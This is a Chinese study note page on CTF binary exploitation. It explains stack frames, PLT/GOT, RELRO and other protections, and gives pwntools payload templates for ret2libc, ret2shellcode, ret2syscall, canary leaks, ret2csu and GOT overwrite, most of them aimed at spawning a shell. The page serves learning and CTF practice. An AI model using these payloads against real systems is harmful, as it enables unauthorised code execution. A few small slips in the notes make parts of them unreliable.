---
title: "pwn学习"
lastmod: 2026-05-13T23:41:13+08:00
draft: false
---
[[libc-database使用说明]]
[[one_gadget]]
[[ROPgadget 1]]
[[yuque-export/1/kali/strings]]
[[pwn栈溢出题型模板]]
# pwn学习
建议顺序：
**第一批，必看**

* 安全客《How2Heap堆利用学习笔记（一）》：先建立 chunk、bin、基础堆利用框架。
* 安全客《How2Heap堆利用学习笔记（二）》：继续看 double free / consolidate 这一块。

**第二批，配套看**

* 看雪《PWN入门-22-FastBin与DoubleFree降妖》：补 FastBin、Double Free 的中文直觉。

**第三批，做题时看**

* CSDN《从零开始学howtoheap：解题西湖论剑Storm\_note》：看 how2heap 思路怎么落地到题解。

你现在如果是为了学“堆溢出”，我建议阅读顺序就定成：

1. **安恒一**：先懂 chunk、free、bin。
2. **看雪 FastBin/Double Free**：把 fastbin 思路补顺。
3. **安恒二**：继续 consolidate / double free。
4. **题解文章**：开始看 off-by-null、overlap、large bin。

<https://www.anquanke.com/post/id/192823>

<https://www.anquanke.com/post/id/193132>

<https://bbs.kanxue.com/thread-286597.htm>

<https://blog.csdn.net/weixin_44626085/article/details/136111705>

# 栈溢出

<https://www.bilibili.com/video/BV1MHHXzvEdc/?spm_id_from=333.788.player.switch&vd_source=32a771c76f944d3de95caeaf9eeade33&p=5>

## 栈溢出

### 寄存器![1773051593719-7523003a-5e3a-4912-b1b8-7433825347b7.png](1773051593719-7523003a-5e3a-4912-b1b8-7433825347b7-485717.png)

```bash
mov al,dh					//内部寄存器之间数据传输
mov [bx],ax				//间接寻址
mov eax,[ebx+esi]	//基址变址寻址
mov al,block			//block为变量名，直接寻址
mov eax,12345678h	//立即数寻址
```

### 汇编指令

cmp

对两个操作数进行减法运算，仅记录标志位信息，不记录结果

OF(Overflow flag)溢出位

SF(Sign flag)负值

ZF(Zero flag)零值

CF(Carry flag)进位

![1773052094325-ff0eb5b5-d9b4-4831-bd8a-a3088f0d9c7e.jpeg](1773052094325-ff0eb5b5-d9b4-4831-bd8a-a3088f0d9c7e-092489.jpeg)

具体操作类似于if

```bash
CMP AX, 5      ; 比较 AX 和 5
JE equal       ; 如果 AX == 5，跳转到标签 equal
JNE not_equal  ; 如果 AX != 5，跳转到标签 not_equal
```

### 栈

```bash
push eax //将eax寄存器的值入栈
esp -= 4
pop eax //将栈顶的值弹出给eax寄存器
esp += 4
```

注意一下函数栈的底存在高地址，底存在低地址，函数入栈是从高往低入栈

每个函数都有自己的函数空间，这个叫做函数栈帧

esp表示顶，ebp表示底，用来表示函数的栈的范围、

1. 进入函数时，常见开头是

`push rbp mov rbp, rsp sub rsp, 0x20`

含义：

- 先把旧 rbp 存到栈里
- 再让新的 rbp = rsp
- 这样当前函数就有了自己的栈帧

2. 函数执行中，局部变量常用 rbp 定位

`[rbp-0x20] 局部缓冲区 [rbp-0x8] 某个局部变量 [rbp] 保存的旧 rbp [rbp+0x8] 返回地址`

3. 函数结束时

`leave ret`

- leave 恢复栈帧
- ret 会把栈上的返回地址弹到 rip
- 然后 CPU 跳回调用者

### 栈帧对齐

只应用于64位系统

在64位系统中，有特别的对其要求，所以在执行libc的命令的时候必须是对准16位的

### 函数调用约定

#### \_\_cdecl

被称为c语言的调用约定。参数按照从右往左的方式入栈，函数本身不清理栈，返回值在eax中。

因为调用者需要清理栈，所以允许可变参数存在

#### \_\_stdcall

又被称为pascal调用。参数按照从右往左的方式入栈，函数自身清理堆栈，返回值在eax中

#### \_\_fastcall

特点是块，通过cpu寄存器来传递参数。用ecx和edx传输前两个双字(DWORD)或者更小的参数，剩下的参数按照从右往左的方式入栈，函数自身清理栈，返回值在eax中

至于为什么从右至左调用是因为函数调用需要把参数压入栈，所以是从右往左

```bash
//c语言
int max(int a,int b);

//调用者
push b
push a
call max

//模拟max执行
call max:
  push eip;	//eip是当前的指令指针，保存下一条要执行的函数，也就是在call指令后程序会跳转到max函数
  jmp max;	//将程序的控制流强制跳转到max函数

//执行者
push ebp//保存上一个函数栈帧，方便执行完函数跳回去
mov ebp,esp
sub esp,XXX//这两行相当于开辟新的栈帧
......
mov eax retVal
leave
ret

leave:
mov esp,ebp
pop ebp
ret:
pop eip
```

![1773058814712-672ff603-d034-45b9-86dd-057308322162.png](1773058814712-672ff603-d034-45b9-86dd-057308322162-510930.png)

这个就是函数栈帧的示意图，但是注意一下这个里面ab两个参数是上一个函数保存进去的

之后就是pwn的内容，静态不看了，直接动态

```bash
gdb ***						//打开程序的动态调试
b *0xaaaaaaaaa		//给aaaaaaa的位置下断点
r									//运行

```

这里使用了cyclic可以找出偏移值

```bash
pwn cyclic 200//生成200位
(gdb)info registers//查看程序崩溃位置
pwn cyclic -l ***//计算偏移位置
```

但是其实可以静态看出来的

```bash
pwntools 常用 API

process(): 加载本地二进制文件，启动进程

remote(): 连接远程服务器

sendline(): 发送数据（包括换行符）

send(): 发送数据（不包括换行符）

interactive(): 启动交互模式，通常获取 shell 后使用这个 API 进行手动交互

p64(), p32(): 封装发送数据的字节序，例如
p64(0x1001) -> \x01\x10

u64(), u32(): 解析封装接收到的数据

recv(): 接收数据

recvuntil(xxx): 接收数据，直到接收到 xxx 才继续执行

gdb.attach(xxx): 启动 gdb 并自动附加，可以选择参数 xxx，在启动 gdb 时执行一些命令

context(log_level="xxx"): 设置调试信息等级等
```

### 表
#### 1. PLT：Procedure Linkage Table，过程链接表

.plt 里面放的是一段一段的小代码，作用是帮程序调用外部函数。

比如你在 IDA 里看到：

`puts@plt system@plt read@plt`

它们不是真正的 puts、system、read，而是程序里的跳板。

大概逻辑是：

`puts@plt: jmp [puts@got]`

也就是：调用 puts@plt 时，它会去 GOT 表里查 puts 的真实地址，然后跳过去。

在 pwn 里常见用法：

`payload = flat( b"A" * offset, elf.plt["puts"], main, elf.got["puts"], )`

这是 32 位写法，意思是：

`puts(puts_got);`

用 puts@plt 打印 puts@got 里保存的真实 libc 地址，从而泄露 libc。

---

#### 2. GOT：Global Offset Table，全局偏移表

.got / .got.plt 里面放的是地址，不是代码。

比如：

`puts@got -> 0xf7e5f140 read@got -> 0xf7edc620`

这些地址运行时才确定，因为 libc 每次加载的位置可能因为 ASLR 不一样。

所以 GOT 的作用是：

`保存外部函数或全局变量的真实运行时地址`

在 pwn 里最常用的是泄露 GOT：

`puts_got = elf.got["puts"] puts_plt = elf.plt["puts"]`

然后调用：

`puts(puts_got)`

程序就会输出 libc 里 puts 的真实地址。

有了真实地址后：

`libc_base = puts_addr - libc.symbols["puts"] system = libc_base + libc.symbols["system"] binsh = libc_base + next(libc.search(b"/bin/sh"))`

然后就可以 ret2libc。

---

#### 3. .got 和 .got.plt 的区别

简单记：

`.got 偏通用，给全局变量、动态链接器、非 PLT 相关重定位用 .got.plt 专门配合 .plt 调外部函数用`

经典动态调用流程里，puts@plt 会查 puts@got.plt。

第一次调用 puts 时，puts@got.plt 里可能还不是 libc 真实地址，而是指向动态链接解析器。动态链接器找到真正的 puts 后，会把真实地址写回 puts@got.plt。

之后再调用：

`puts@plt -> puts@got.plt -> libc puts`

就直接跳过去了。

这叫 **lazy binding，延迟绑定**。

---

#### 4. .plt.got 是什么

.plt.got 名字很像 .got.plt，但它们不是一回事。

`.got.plt 是数据表，里面放地址 .plt.got 是代码段，里面放跳板`

.plt.got 也是 PLT 类跳板，只是它通常用于某些不走经典 lazy binding 流程的外部符号。里面常见的是很短的跳转代码：

`jmp dword ptr [xxx@got]`

所以：

`.plt 代码，经典外部函数跳板 .plt.got 代码，另一类外部符号跳板 .got 数据，地址表 .got.plt 数据，给 .plt 用的地址表`

在 pwn 里你一般不用太纠结 .plt 和 .plt.got 的底层区别。看到 xxx@plt、xxx@plt.got，本质上都可以先理解成：

`程序里用来跳到外部函数 xxx 的小跳板`

但泄露地址时，你泄露的一般是 GOT：

`elf.got["puts"]`

而不是 PLT。

---

#### 5. extern 是什么

IDA 里看到的 extern，通常不是 ELF 里真正的一张“可利用表”，而是反汇编器整理出来的外部符号区域。

比如：

`extern puts extern read extern system extern __libc_start_main`

它的意思是：

`这个函数/变量不是当前程序定义的，而是外部动态库提供的`

对应 ELF 里更真实的数据来源一般是：

`.dynsym 动态符号表 .dynstr 动态字符串表 .rel.plt / .rela.plt PLT 重定位信息 .rel.dyn / .rela.dyn 其他动态重定位信息`

你在 IDA 里看到 extern puts，主要用途是帮助你知道：

`这个程序导入了 puts 所以可能有 puts@plt 所以可能有 puts@got 所以可以用 puts 泄露 libc`

---

#### 6. 它们怎么配合工作

假设程序里有：

`puts("hello");`

编译成动态链接后，不会直接写死 libc 里 puts 的地址，而是类似：

`call puts@plt`

然后：

`puts@plt -> 查 puts@got.plt -> 如果还没解析，进入动态链接器 -> 动态链接器找到 libc 里的 puts -> 把真实地址写入 puts@got.plt -> 跳到 libc puts`

第二次再调用：

`puts@plt -> puts@got.plt -> libc puts`

---

#### 7. pwn 里怎么用

最常见三种用法。

第一种：调用现成 PLT 函数。

如果程序导入了 system，可以直接：

`payload = flat( b"A" * offset, elf.plt["system"], 0xdeadbeef, binsh_addr, )`

32 位下就是：

`system@plt 返回地址 参数1`

第二种：泄露 libc 地址。

`payload = flat( b"A" * offset, elf.plt["puts"], elf.symbols["main"], elf.got["puts"], )`

含义：

`puts(puts_got); return main;`

输出的 puts_got 内容就是 libc 里 puts 的真实地址。

第三种：改 GOT 表。

如果是 **Partial RELRO**，.got.plt 通常可写。可以把某个 GOT 项改掉，比如：

`puts@got -> system`

之后程序执行：

`puts("/bin/sh");`

实际就变成：

`system("/bin/sh");`

但如果是 **Full RELRO**，GOT 在程序启动时就解析完并设为只读，通常不能再改 GOT。

---

#### 8. RELRO 对 GOT 的影响

这个很重要：

`No RELRO: GOT 可写，危险最大 Partial RELRO: .got 通常只读，但 .got.plt 仍可能可写 常见 GOT overwrite 可以用 Full RELRO: 所有 GOT 启动时解析完成，然后设为只读 GOT overwrite 基本不可用`

所以看到：

`RELRO: Partial RELRO`

你就可以考虑：

`泄露 GOT 改 GOT ret2plt ret2libc`

看到：

`RELRO: Full RELRO`

就别优先想着 GOT overwrite 了，更多考虑泄露 libc 后直接 ROP 调 system、one_gadget、ret2csu、栈迁移等。

---

最短记忆版：

```
plt: 代码跳板，用来调用外部函数。 pwn 里常用 elf.plt["puts"] 调 puts。 
got: 地址表，保存外部函数/变量的真实地址。 pwn 里常用 elf.got["puts"] 泄露 libc。 
got.plt: GOT 中专门服务 PLT 的部分，经典 lazy binding 用它。
plt.got: PLT 类型的代码跳板，不是地址表。 
extern: IDA/Ghidra 给你看的外部符号列表
```
### 地址

#### 1. 程序本身的代码地址（全局变量）

如果程序是：

`PIE: No PIE`

那程序本体地址通常不变，比如：

`elf.plt["puts"] elf.got["puts"] elf.symbols["main"]`

这些在本地和远程一般一样。

例如：

`main = 0x08048768 puts@plt = 0x08048430 puts@got = 0x0804a014`

只要远程用的是同一个 pwn 文件，并且 PIE 没开，这些地址通常固定。

如果是：

`PIE: enabled`

那程序本体每次加载基址都可能变，本地和远程也会变。此时你不能直接写死：

`elf.symbols["main"]`

而要先泄露程序地址，再算 PIE base：

`pie_base = leaked_main - elf.symbols["main"] main_addr = pie_base + elf.symbols["main"]`

---

#### 2. 栈地址

栈地址几乎一定会变。

比如：

`本地: 0xffffd120 远程: 0xffd8a7c0`

原因包括：

`ASLR 环境变量不同 启动参数不同 远程服务包装器不同 libc / ld 布局不同`

所以像 pwn75 这种栈迁移题，如果你本地算了一个：

`fake_stack = 0xffffd100`

拿到远程大概率不能直接用。

正确方式通常是让程序泄露一个栈地址，比如：

`io.recvuntil(b"Nothing here ,") stack_addr = int(io.recvline().strip(), 16) fake_stack = stack_addr - 0x??`

也就是：**每次运行都动态接收，再计算。**

---

#### 3. libc 地址

libc 地址也会变，尤其远程和本地使用的 libc 可能不一样。

比如你本地：

`puts = 0xf7e5f140`

远程可能是：

`puts = 0xf7dca360`

所以不能直接把本地调出来的 system 地址发到远程。

常见做法是泄露 libc 函数地址：

`puts_addr = u32(io.recvn(4)) libc_base = puts_addr - libc.symbols["puts"] system = libc_base + libc.symbols["system"] binsh = libc_base + next(libc.search(b"/bin/sh"))`

如果远程 libc 和本地不同，还要拿远程 libc，或者用 LibcSearcher / libc database 根据泄露地址判断版本。

---

#### 4. 堆地址

堆地址也会变。

例如：

`heap base malloc chunk 地址 tcache 地址`

这些受 ASLR 和程序运行状态影响，通常也要靠泄露。

---

#### 5. GOT / PLT 地址

这个要分情况：

如果：

`PIE: No PIE`

那么：

`elf.got["puts"] elf.plt["puts"]`

这类地址一般本地远程一样。

如果：

`PIE: enabled`

它们也会跟着程序基址变。

不过注意：puts@got 这个“GOT 表项的地址”可能固定，但 GOT 表项里面保存的“libc puts 真实地址”会变。

例如 No PIE 下：

`puts@got 表项地址: 0x0804a014 固定 puts@got 里面的内容: 0xf7e5f140 会变`

---

你可以这样记：

`No PIE 程序本体地址: 基本不变 PIE 程序本体地址: 会变 栈地址: 会变 堆地址: 会变 libc 地址: 会变 GOT 表项地址: No PIE 下不变，PIE 下会变 GOT 表项里的内容: 通常会变，因为它是 libc 的真实地址`
### 调用参数写法
pop gadget:
    参数放在 pop gadget 后面，因为 pop 会从栈上取值进寄存器。

32 位普通函数:
    函数地址后面先放返回地址，再放参数，因为函数从栈上取参数。

64 位普通函数:
    先用 pop rdi / pop rsi / pop rdx 设置寄存器，再跳函数。

32 位 syscall int 0x80:
    先用 pop eax/ebx/ecx/edx 设置寄存器，再 int 0x80。

### ret2shellcode

#### PIE

在没有开启任何保护的情况下，程序会加载到一个固定的地址上，我们可以通过加上偏移量即可得到有效地址，而且偏移量通常可以通过逆向确定

PIE选项开启的时候程序会被胡乱的加载到内存随机的位置，这个位置只有操作系统才知道，所以比较难定位内存数据

#### NX

通过修改代码段的权限设置将没有必要的权限移除，就不能随意挟持程序执行流

#### Canary

金丝雀，在ebp的上方放置一个独特的，不可预测的数据，在执行重要操作的时候会检测这个金丝雀有没有被更改，如果改动了程序会直接退出

#### RELRO

RELRO 全称是 **RELocation Read-Only**，可以理解成：**程序启动时把一些和动态链接相关的表处理好，然后尽量改成只读，防止攻击者篡改 GOT 表。**

在 pwn 里，你可以先把它记成一句话：

`RELRO 是用来保护 GOT 表的。`

GOT 表里放什么？

比如程序调用：

`read(0, buf, 0x100);`

动态链接程序一开始不一定知道 libc 里 read 的真实地址，所以会通过 PLT/GOT 解析。

大概关系是：

`read@plt -> read@got -> libc 里的 read`

read@got 这个位置里保存的就是 read 的真实地址。

如果 GOT 可写，攻击者就可以做这种事：

`把 read@got 改成 system 地址`

之后程序再调用：

`read(...)`

实际上就会跳到：

`system(...)`

这就是 GOT 劫持。

RELRO 就是为了限制这种攻击。

### ret2text

.text是代码的程序执行段，所有可以被cpu执行的代码段都位于.text中\
ret2text就是控制程序执行流返回到程序自身中，实际中之前演示就用到了这种方式

直接用execve system等函数获取shell命令

根据函数调用，在一个函数执行的最后一个是leave;ret

##### 1. `leave` 指令

<code>**leave**</code> 是一个组合指令，它实际上等价于下面这两条指令：

```plain
mov esp, ebp    ; 将栈指针 esp 恢复为基指针 ebp 的值
pop ebp         ; 恢复调用者的栈帧基指针 ebp，恢复到上一个函数的栈帧
```

**作用**：`leave` 指令会恢复栈指针和基指针，确保返回前栈的状态被正确恢复。它为函数返回做准备。

##### 2. `ret` 指令

<code>**ret**</code> 指令会从栈中弹出一个地址，并跳转到该地址执行，即返回到调用该函数的位置。栈中弹出的地址就是 **返回地址**，它是 <code>**call**</code>\*\* 指令压入栈中的返回地址\*\*，指向调用该函数后要继续执行的下一条指令。

```plain
pop eip    ; 弹出栈中的返回地址到 eip，执行跳转
```

这个时候我们在填充一个shellcode，然后返回地址为jmp esp即可利用

ROPgadget --binary \*\*\*\*\*\* --only jmp

这里面jmp会寻找这个文件里面的jmp指令

| 特性 | `jmp esp` | `ret` |
| --- | --- | --- |
| **跳转方式** | 无条件跳转到栈指针（`esp`<br/>）指向的地址 | 跳转到栈中弹出的返回地址 |
| **用途** | 常用于绕过栈保护、跳转到栈中的恶意代码 | 用于函数返回，恢复调用函数后的执行位置 |
| **执行过程** | 直接跳转到栈顶，执行位于栈中的代码 | 弹出返回地址并跳转到该地址 |
| **应用场景** | 栈溢出攻击、控制流劫持 | 函数调用返回、栈溢出利用（通过控制返回地址） |

### ret2syscall

#### ROT

rot就是返回导向编程，在存在nx保护的情况下，使用程序本身自带的指令片段来完成特定功能。

在开启NX的情况下，可以直接使用他自带的ret指令来

#### 系统调用

内核会提供给用户空间和内核空间进行交互的一套标准接口，这些接口让用户态程序能受限访问迎接设备。

systemcall就是连接用户态和内核的。linux系统中，用户通过向内核发送syscall产生软中断，，从而让程序陷入内核态执行相应的操作。而对于每个系统调用都会有一个对应的系统调用号。系统调用提供用户程序与操作系统间的接口。

![1773150856397-bffb448b-924b-4cc7-a33b-7421b8c74ea7.png](1773150856397-bffb448b-924b-4cc7-a33b-7421b8c74ea7-703987.png)

32位系统通过int 0x80调用

64位系统通过syscall触发

在传参的基础上

### ret2text

反编译的时候如果看到程序里面本来就有后门函数，比如

```c
void backdoor()
{
    system("/bin/sh");
}
```

或者

```c
void getflag()
{
    system("cat /ctfshow_flag");
}
```

那就不用想复杂的，直接把返回地址覆盖成这个函数地址。

找函数地址

```bash
nm ./pwn | grep backdoor
objdump -d ./pwn | grep backdoor
```

IDA里面也可以直接看函数窗口。

payload大概是

```python
payload = b"A" * offset
payload += p64(backdoor)   # 64位
```

32位就是

```python
payload = b"A" * offset
payload += p32(backdoor)
```

运行成功以后一般不会输出复杂东西，要么直接打印flag，要么进入shell。

### ret2shellcode

如果`NX disabled`，说明栈可以执行，这个时候可以直接把shellcode放到栈上。

先看保护

```bash
checksec ./pwn
```

如果输出里面是

```text
NX: NX disabled
```

就可以考虑shellcode。

最简单的情况是程序会泄露栈地址，比如输出

```text
buf address: 0x7fffffffe230
```

那么payload就是

```python
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(offset, b"A")
payload += p64(buf_addr)
```

如果没有泄露栈地址，但是能找到`jmp esp`或者`jmp rsp`，也可以跳到当前栈顶。

找跳板

```bash
ROPgadget --binary ./pwn --only "jmp|call" | grep rsp
ROPgadget --binary ./pwn --only "jmp|call" | grep esp
```

32位常见payload

```python
jmp_esp = 0x08048d17
shellcode = asm(shellcraft.sh())

payload = shellcode
payload = payload.ljust(offset, b"A")
payload += p32(jmp_esp)
```

成功以后不会先泄露libc，直接进入shell。

### ret2reg

ret2reg就是返回到寄存器指向的位置。

比如反编译看到程序把输入读到buf里面，函数返回前`eax`刚好还是buf地址。这个时候找一个

```asm
call eax
jmp eax
```

就能直接执行buf里面的shellcode。

调试看寄存器

```gdb
b *函数返回前地址
r
info registers
```

如果看到

```text
eax  0xffffd2c0
```

再看这个地址

```gdb
x/20xb 0xffffd2c0
```

如果里面是我们输入的shellcode，就可以ret2reg。

找gadget

```bash
ROPgadget --binary ./pwn --only "call|jmp" | grep eax
```

payload

```python
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(offset, b"A")
payload += p32(call_eax)
```

### ret2syscall

NX开了，但是程序是静态链接，里面gadget很多，就可以直接系统调用。

32位执行`execve("/bin/sh", 0, 0)`需要

```text
eax = 0xb
ebx = "/bin/sh"地址
ecx = 0
edx = 0
int 0x80
```

64位执行`execve("/bin/sh", 0, 0)`需要

```text
rax = 59
rdi = "/bin/sh"地址
rsi = 0
rdx = 0
syscall
```

找gadget

```bash
ROPgadget --binary ./pwn --only "pop|int|syscall"
ROPgadget --binary ./pwn --ropchain
readelf -S ./pwn | grep .bss
```

如果程序里没有`/bin/sh`字符串，就先用`read`写到`.bss`。

32位常见写法

```python
payload = b"A" * offset

# read(0, bss, 8)
payload += p32(pop_eax) + p32(3)
payload += p32(pop_edx) + p32(8)
payload += p32(pop_ecx_ebx) + p32(bss) + p32(0)
payload += p32(int_80)

# execve(bss, 0, 0)
payload += p32(pop_eax) + p32(0xb)
payload += p32(pop_edx) + p32(0)
payload += p32(pop_ecx_ebx) + p32(0) + p32(bss)
payload += p32(int_80)
```

第一次payload执行到`read(0, bss, 8)`时，程序会像卡住一样等第二次输入，这个时候发送

```python
b"/bin/sh\x00"
```

然后ROP链继续执行`execve`。

### ret2libc

动态链接程序里一般会有`puts@plt`、`puts@got`、`read@plt`这些东西。

如果NX开了，又没有后门函数，就常用ret2libc。

核心是先泄露libc地址

```text
puts(puts_got)
```

然后计算

```text
libc_base = puts_addr - libc.symbols["puts"]
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
```

64位传参要用`pop rdi; ret`

```bash
ROPgadget --binary ./pwn --only "pop|ret" | grep "pop rdi"
```

64位payload

```python
payload1 = b"A" * offset
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)
payload1 += p64(puts_plt)
payload1 += p64(main)
```

程序会输出一个泄露地址，通常长得像

```text
0x7fxxxxxxxxxx
```

接收的时候常用

```python
puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
```

因为在 64 位 Linux 里，libc 地址虽然理论上是 8 字节，但实际用户态地址通常只用到低 6 字节，高 2 字节一般是 \x00\x00。

比如泄露出来的 puts 地址可能是：

`0x00007f3a12345670`

完整 8 字节小端表示是：

`b'\x70\x56\x34\x12\x3a\x7f\x00\x00'`

但如果你用 puts(puts_got) 来泄露，puts 会把 GOT 里的地址当字符串打印。由于高位有 \x00，字符串会在这里截断，所以你通常只能收到前 6 个有效字节：

`b'\x70\x56\x34\x12\x3a\x7f'`

这时候要把它还原成 8 字节地址，就需要右侧补两个 \x00：

`b'\x70\x56\x34\x12\x3a\x7f'.ljust(8, b'\x00')`

变成：

`b'\x70\x56\x34\x12\x3a\x7f\x00\x00'`

然后再：

`u64(...)`

得到：

`0x00007f3a12345670`

所以这句：

`u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))`

可以拆开看：

`data = io.recvuntil(b"\x7f") # 收到 libc 地址常见的最高有效字节 0x7f 为止 leak = data[-6:] # 取最后 6 字节有效地址 leak = leak.ljust(8, b"\x00") # 补成 8 字节 addr = u64(leak) # 小端转整数`

为什么是 recvuntil(b"\x7f")？

因为 64 位 Linux 下 libc 地址经常长这样：

`0x00007fxxxxxxxxxx`

小端序泄露出来时字节顺序是：

`xx xx xx xx xx 7f`

所以 \x7f 经常是这 6 个有效字节的最后一个字节。

一句话：

`只取 6 位：因为用户态 libc 地址常见有效部分只有 6 字节 `
`补两个 \x00：因为真实 64 位地址高 2 字节是 0`

第二段

```python
payload2 = b"A" * offset
payload2 += p64(ret)       # 有时候用于栈对齐
payload2 += p64(pop_rdi)
payload2 += p64(binsh)
payload2 += p64(system)
```

如果没有`ret`对齐，可能会在`system`里面因为`movaps`崩掉。这个时候多加一个单独的`ret`就行。

32位ret2libc更简单，因为参数走栈

```python
payload = b"A" * offset
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(binsh)
```

### one_gadget

如果程序直接泄露了某个libc函数地址，比如一开始输出

```text
printf address: 0x7fxxxxxxxxxx
```

然后又让我们输入一个地址并调用它，就可以用one_gadget。

找one_gadget

```bash
one_gadget libc.so.6
```

会输出类似

```text
0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

payload就是

```python
libc_base = printf_addr - libc.sym["printf"]
payload = hex(libc_base + 0x10a2fc).encode()
```

但是one_gadget有约束，不满足就会崩。不是所有one_gadget都能用。

### Canary泄露

如果`checksec`看到

```text
Canary found
```

直接覆盖返回地址会触发

```text
*** stack smashing detected ***
```

这时候要先泄露Canary。

常见情况是程序会回显输入，比如

```c
read(0, buf, 0x40);
printf("Hello %s", buf);
```

Canary最低字节一般是`\x00`，所以字符串输出会被截断。常见做法是多覆盖1个字节，把`\x00`覆盖掉，让程序把后面的Canary带出来。

第一次payload

```python
payload1 = b"A" * (到canary的距离 + 1)
```

回显可能是

```text
Hello AAAAA...
```

后面跟着的就是Canary剩余字节。

还原

```python
canary = u64(leak.ljust(8, b"\x00")) & 0xffffffffffffff00
```

第二次payload

```python
payload2 = b"A" * 到canary的距离
payload2 += p64(canary)
payload2 += b"B" * 8
payload2 += p64(target)
```

重点是Canary必须原样写回去。

#### 部分覆盖返回地址

如果PIE没开，或者目标地址和原返回地址只有最后一两个字节不同，可以只覆盖低字节。

比如原返回地址是

```text
0x4007a0
```

目标地址是

```text
0x400742
```

那么有时候只需要覆盖最后一个字节

```python
payload = b"A" * offset
payload += b"\x42"
```

这种题常和Canary一起出现：先泄露Canary，再写回Canary，最后只改返回地址低字节。

### ret2csu

64位程序有时候找不到好用的`pop rdi; pop rsi; pop rdx; ret`，但是可以用`__libc_csu_init`里面的万能gadget。

反汇编看

```bash
objdump -d ./pwn | grep -A40 "__libc_csu_init"
```

常见两段

```asm
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret
```

和

```asm
mov rdx, r15
mov rsi, r14
mov edi, r13d
call [r12 + rbx*8]
```

设置成

```text
rbx = 0
rbp = 1
r12 = 函数got
r13 = rdi
r14 = rsi
r15 = rdx
```

就可以调用任意已有函数，比如

```text
read(0, bss, 0x100)
```

payload函数通常写成

```python
def csu(call_got, rdi, rsi, rdx):
    payload = p64(csu_pop)
    payload += p64(0) + p64(1) + p64(call_got)
    payload += p64(rdi) + p64(rsi) + p64(rdx)
    payload += p64(csu_call)
    payload += b"A" * 0x38
    return payload
```

### ret2dlresolve


动态链接程序调用外部函数时，会通过`.plt/.got/.rel.plt/.dynsym/.dynstr`解析真实函数地址。

ret2dlresolve就是伪造这些解析结构，让动态链接器帮我们解析`system`。

动态链接程序调用 libc 函数时，不是直接把 libc 地址写死在程序里，而是通过 PLT/GOT 和动态链接器解析。


以 `read` 为例：

```asm
08048370 <read@plt>:
  jmp DWORD PTR ds:0x80498c8
  push 0x8
  jmp 0x8048350
```

含义大概是：

```text
read@plt 第一条：跳到 read@got 里保存的地址
如果还没解析：read@got 会指回 read@plt+6
read@plt+6：push 一个重定位偏移，然后进入 PLT0
PLT0：调用动态链接器 _dl_runtime_resolve
动态链接器：根据重定位表、符号表、字符串表，找到真正的 read 地址
```

这里用的是+6的原因是上一个机器码的长度就是六，即`jmp DWORD PTR ds:0x80498c8`的长度是六
这里的push 0x8是传一个编号进来
代表使用第8的编号的数据
最后的jmp的跳转就是0x8048350+0x8

完整解析流程：
```
call read@plt
    |
    v
read@plt:
    jmp [read@got]
    |
    v
read@got 还没解析，所以跳到 read@plt+6
    |
    v
push 0x8
jmp plt0
    |
    v
plt0:
    push [got+4]
    jmp [got+8]
    |
    v
动态链接器 _dl_runtime_resolve
    |
    v
解析 read，写回 read@got
    |
    v
调用真正的 read

```

下面这些是plt里面的内容，是动态解析的公共入口代码

```
.rel.plt + 0x00  setbuf
.rel.plt + 0x08  read
.rel.plt + 0x10  strlen
.rel.plt + 0x18  __libc_start_main
.rel.plt + 0x20  write
```
这个表格的意义是让我们之后找到了函数对应的真实位置以后直到我们应该把真实地址放到plt表的哪里

这里最重要的是：动态链接器解析函数名时，会用到 `.dynstr` 字符串表。

`.dynstr` 里放着这些字符串：

```text
libc.so.6
_IO_stdin_used
stdin
strlen
read
stdout
setbuf
__libc_start_main
write
GLIBC_2.0
__gmon_start__
```

符号表 `.dynsym` 里的符号不会直接保存 `"read"` 这几个字母，而是保存一个偏移，表示“去 `.dynstr` 里哪个位置取函数名”。

所以动态链接器解析 `read` 时，逻辑可以粗略理解成：

```text
找到 read 对应的符号表项
从符号表项里拿到字符串偏移
去 .dynstr + 偏移 找到字符串 "read"
去 libc 里查找名字叫 "read" 的函数
把真实 read 地址写入 read@got
```

#### readelf -S ./pwn 

看 section 表
-S 是 --section-headers，查看 ELF 里的 section。
它告诉你程序里有哪些段/节，比如：

`.text .plt .got .got.plt .dynsym .dynstr .rel.plt .dynamic .bss`

```
Name：section 名字
Addr：运行时虚拟地址，pwn 里常用
Off：文件偏移
Size：大小
Flg：权限，A=加载到内存，W=可写，X=可执行
```
#### readelf -r ./pwn   

-r 是 --relocs，查看重定位表。

重定位表记录的是：

`哪个 GOT 表项，对应哪个动态符号。`

```
Offset：要被修改的 GOT 地址
Type：重定位类型
Sym. Name：这个 GOT 项对应哪个符号
```

#### readelf -d ./pwn   

-d 是 --dynamic，查看 .dynamic 动态段。

.dynamic 是动态链接器的“配置表”，告诉动态链接器：

`字符串表在哪里 符号表在哪里 重定位表在哪里 GOT 在哪里 需要加载哪个 libc`

```
NEEDED：程序依赖哪个动态库
STRTAB：.dynstr 字符串表地址
SYMTAB：.dynsym 符号表地址
STRSZ：字符串表大小
PLTGOT：.got.plt 地址
JMPREL：.rel.plt 地址
PLTRELSZ：.rel.plt 总大小
```

#### objdump -s -j .dynamic ./pwn

把 ./pwn 这个 ELF 文件里的 .dynamic 段，以原始十六进制形式 dump 出来

#### objdump -d -j .plt -Mintel ./pwn

查看plt表内容

```
0x00000005 -> DT_STRTAB   -> .dynstr 地址
0x00000006 -> DT_SYMTAB   -> .dynsym 地址
0x00000017 -> DT_JMPREL   -> .rel.plt 地址
0x00000003 -> DT_PLTGOT   -> .got.plt 地址
0x0000000a -> DT_STRSZ    -> .dynstr 大小
0x0000000b -> DT_SYMENT   -> .dynsym 中每个符号表项大小
0x00000002 -> DT_PLTRELSZ -> .rel.plt 总大小
0x00000001 -> DT_NEEDED   -> 依赖库名字在 .dynstr 里的偏移
0x00000004 -> DT_HASH     -> .hash 地址
0x6ffffef5 -> DT_GNU_HASH -> .gnu.hash 地址
0x00000007 -> DT_RELA     -> .rela.dyn 地址，64 位常见
0x00000008 -> DT_RELASZ   -> .rela.dyn 总大小
0x00000009 -> DT_RELAENT  -> .rela.dyn 中每个重定位项大小
